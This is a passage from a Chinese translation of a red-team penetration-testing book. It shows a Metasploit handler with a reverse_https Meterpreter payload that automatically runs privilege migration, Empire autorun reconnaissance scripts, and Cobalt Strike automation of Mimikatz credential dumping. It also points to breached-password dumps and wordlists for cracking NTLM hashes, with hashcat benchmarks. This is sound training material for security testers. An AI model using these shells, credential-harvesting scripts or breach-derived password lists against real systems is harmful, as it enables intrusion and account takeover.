体系的工作机制、编写底层代码以直接与 Windows API 而不是 shell 命令进行交互，以及跳出框框进行创造性思考
这些能力是非常重要的。如果你的关注点仅限于一些常用工具，那么你的入侵行动有很大的概率会在企业环境中被检
测到。如果这些工具是公开的，那么安全厂商很可能会在它们刚出现时候就对其进行逆向并且为它们开发签名。你可
以利用当前已有的攻击工具并以某种方式对其进行定制化二次开发，使其不能被这些安全厂商识别。
第8章 特勤组——破解、漏洞利用和技巧
译者：@Snowming
校对者：@鸫、@哈姆太郎、@匿名jack
本章重点介绍了一些我个人发现的对红队和渗透测试都有用的不同资源。这些资源可能不会在每个模拟入侵行动中都
用到，但对于特定场景或在某一次的案例中可能非常有用。
自动化
随着基于启发式（heuristic-based）的端点保护变得越来越完善，我们的攻击需要变得更加迅速。我们通常可以编写
恶意软件来躲避杀毒软件和绕过初始检测，但是一旦我们开始在内存中调用 Mimikatz  或者进行横向移动到其他主
机，我们就会开始触发报警。为了解决这个问题，我总是告诉红队，我们的初步试探可以故意让蓝队捕获。因为通常
情况下，蓝队在发现我们使用的默认/基础恶意软件（或者仅仅进行了轻微的混淆）时就会将此视为胜利，但我们的
真正目的是了解他们的环境。这是通过我们的初始 payload 在受害者的机器上自动运行多个侦察脚本来实现的。在
下一节中，我们将介绍一些可以使我们的一些攻击自动化的快速自动运行脚本。
使用 RC 脚本自动化运行 Metasploit
对于 Metasploit，我们可以使用以下方法高效地运行我们的后渗透利用脚本：
搜索 Metasploit 中所有的后渗透利用模块：
msfconsole
show post
从显示的结果中，选择你想要包含的所有模块，以便在接收到一个 Meterpreter Shell 时自动执行。在这个案例中，
我们将为我们的攻击添加一个 privilege migrate 后渗透模块。要配置 Meterpreter Shell 以便让它在受攻击主机的初
始连接上运行此 payload，我们需要指定一个 AutoRunScript  参数。你可以根据需要添加尽可能多的
AutoRunScripts  参数来转储（dump）有关系统和网络的信息，然后横向移动,甚至更多！
创建处理程序 (Handler) 和 AutoRunScript：
创建处理程序文件
gedit handler.rc
配置处理程序和自动运行脚本
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 10.100.100.9
set LPORT 443
set AutoRunScript post/windows/manage/priv_migrate
set ExitOnSession false
set EnableStageEncoding true
exploit -j
启动处理程序
msfconsole -r handler.rc
自动化运行 Empire
Empire 具有与 Metasploit 资源文件类似的功能，可以自动完成许多重复性任务。首先，我们需要创建一个文件（在
我们的示例中，我们将创建一个名为 /opt/empire_autoload.rc 的文件）然后在我们的 Empire 实例中加载它。
在一个单独的终端窗口中，创建一个处理程序文件：
添加所有你想要执行的后渗透模块：
在 Empire 中，加载 autoload.rc 资源文件：
agents 
autorun /opt/empire_autoload.rc powershell  
autorun show 
gedit /opt/empire_autoload.rc
usemodule situational_awareness/network/powerview/get_user 
execute
back 
usermodule situational_awareness/network/powerview/get_computer 
execute
back
如你所见，当代理连接时，它会自动运行 get_user  和 get_computer  的 PowerShell 脚本。这些脚本的所有运行
结果都将存储在 agent.log 文件中。在这种情况下，我们的代理名称是 N6LM348G，因此我们的日志将存储在
/opt/Empire/downloads/N6LM348G/agent.log。
自动化运行 Cobalt Strike
Cobalt Strike 如此强大的一个主要原因是因为它有 Aggressor 脚本。使用 Cobalt Strike 的 Aggressor 脚本，你不仅
可以配置自动运行的脚本，还可以创建非常复杂的攻击。例如，我经常遇到进攻共享工作站的场景，例如实验室服务
器或会议室盒子。我可能就会希望我们的代理机器最好能每隔半小时运行 Mimikatz 以获取明文凭证。使用
Aggressor 脚本，我们可以执行所有这些操作甚至更多操作。下面是一个示例脚本： mimikatz-every-30m.cna。
Aggressor 其他脚本集合：
https://github.com/bluscreenofjeﬀ/AggressorScripts
https://github.com/harleyQu1nn/AggressorScripts
自动化的未来
最后，有一些很酷的项目正朝着自动化，智能入侵和 APT 攻击的方向发展。我坚信入侵行动的未来是朝着自动化的
方向发展的，我们需要自动化地测试和验证我们的安全控制机制。我认为在发展这种自动化趋势方面具有巨大潜力的
两个工具是：
Portia
Caldera
密码破解
我了解的最新的和最喜欢的密码列表之一是来自最近发现的41 GB 大小的密码脱库，它包含14亿的用户名和密码（ h
ttp://bit.ly/2HqbYk8 ）。不过，我不想直接把下载链接展示出来，因为它包含很多敏感的用户名（或电子邮件）和
相关密码，但你可以搜索 BreachCompilation.tar.bz2  以查找有关它的更多信息。在下载这些非常敏感的信息之
前，请先查看你所在国家的法律。我建议你不要下载原始数据，只需下载密码列表即可。我已经下载了这个41GB 的
字典，然后删除了所有用户名和电子邮件，并整理出了只是密码的数据。位于：http://thehackerplaybook.com/ge
t.php?type=THP-password 。
在我的个人机器上，我使用8块技嘉 GV-N108TTURBO-11GD AORUS GeForce GTX 1080 Ti Turbo 11G 显卡，大约
价值12,000美元，你也可以构建自己的一个机器，包括机箱、RAM、电源、SSD 和 GPU。当然，机箱至少需要一个
4U机架（例如：SYS-4028GR-TR2）并且供应充足的电。虽然绝对不便宜，但我们每秒大约能枚举472,000,000,000
个哈希值，可以爆破 Windows NTLM(Windows) 哈希。这是八个 GPU 的 hashcat 基准测试：
Hashmode: 1000 - NTLM 
Speed.Dev.#1…..: 59436.3 MH/s (63.16ms)  
Speed.Dev.#2…..: 58038.3 MH/s (64.70ms)  
Speed.Dev.#3…..: 59104.4 MH/s (63.55ms)  
Speed.Dev.#4…..: 59123.0 MH/s (63.52ms)  
Speed.Dev.#5…..: 58899.7 MH/s (63.74ms)  
Speed.Dev.#6…..: 59125.8 MH/s (63.51ms)  
Speed.Dev.#7…..: 59256.3 MH/s (63.36ms)  
Speed.Dev.#8…..: 59064.5 MH/s (63.56ms)  
Speed.Dev.#*…..:  472.0 GH/s 
对于那些买不起大型 GPU 设备的人来说，还有其他选择。你可以考虑在云服务器中进行密码破解的操作，虽然仍然
不怎么便宜。最近，亚马逊已经集成了 TESLA GPU（不是特斯拉汽车），它们比1080Ti 更强大。关于如何使用这些
GPU 设置你自己的密码破解服务器，在 Medium 上有一篇很棒的文章：https://medium.com/@iraklis/running-ha
shcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b 。
来自 Iraklis Mathiopoulos 的文章中的数据：
译者注：Iraklis Mathiopoulos 是上面这篇文章的作者。
Hashmode: 1000 - NTLM: 
Speed.Dev.#1…..: 79294.4 MH/s (33.81ms)  
Speed.Dev.#2…..: 79376.5 MH/s (33.79ms)  
Speed.Dev.#3…..: 79135.5 MH/s (33.88ms)  
Speed.Dev.#4…..: 79051.6 MH/s (33.84ms)  
Speed.Dev.#5…..: 79030.6 MH/s (33.85ms)  
Speed.Dev.#6…..: 79395.3 MH/s (33.81ms)  
Speed.Dev.#7…..: 79079.5 MH/s (33.83ms)  
Speed.Dev.#8…..: 79350.7 MH/s (33.83ms)  
Speed.Dev.#*…..: 633.7 GH/s 
对于同样的 NTLM 哈希值，使用 TESLA GPU 显卡破解的总速度比使用1080Ti GPU显卡大约快34％。但是运行 AWS
的总成本约为每小时25美元。因此，你需要根据自己的预算、需求和目标来选择。
实验：
最近，Have I Been Pwned 网站的创始人 Troy Hunt 发布了一个 SHA1 密码哈希列表，压缩之后的体积大约为5.3
GB。这是有史以来的数据泄露、脱库中一个非常大的列表了。这是一个测试你密码破解技巧的绝佳素材:
https://downloads.pwnedpasswords.com/passwords/pwned-passwords-1.0.txt.7z
随着这些 GPU 的破解速度变得越来越快，10个字符以下的密码可以在相对合理的时间范围内进行智能化破解。其中
一些可以通过使用高质量的密码掩码来破解，但是大多数情况下，主要取决于密码列表自身的复杂程度。破解大于12
个字符的密码的最快方法之一就是使用来自于真实数据泄露事件的密码列表。回顾过去所有的数据泄露事件，我们可
以很好地了解人类如何创建密码，混淆密码的常用技巧以及最常用的单词。使用复杂规则集配合这些密码字典，可以
让我们以极快的速度破解密码（有时超过25个字符）。但请记住，你的密码列表取决于你构建和维护它的程度。作为
红队队员，我们会定期跟踪我们破解的所有帐户，对其进行分析并将其添加到我们的密码字典中。我们还会不断监控
新的数据泄露事件，访问 pastebin 和 pastie 网站等，以查找更新的密码。此处有一个很好的监控列表：https://inte
ltechniques.com/OSINT/pastebins.html 。
我最喜欢的密码列表：
berzerk0的 Real-Password-WPA 密码列表：
18.6 GB 未压缩
http://bit.ly/2EMs6am
berzerk0 的字典风格的列表：
1 GB 未压缩
http://bit.ly/2GXRNus
Xato 的千万数量的密码
magnet:?xt=urn:btih:32E50D9656E101F54120ADA3CE73F7A65EC9D5CB
Hashes.org
https://hashes.org/left.php
几千兆字节，而且每天都在增长
Crackstation
15 GB 未压缩
https://crackstation.net/ﬁles/crackstation.txt.gz
Weakpass（弱密码）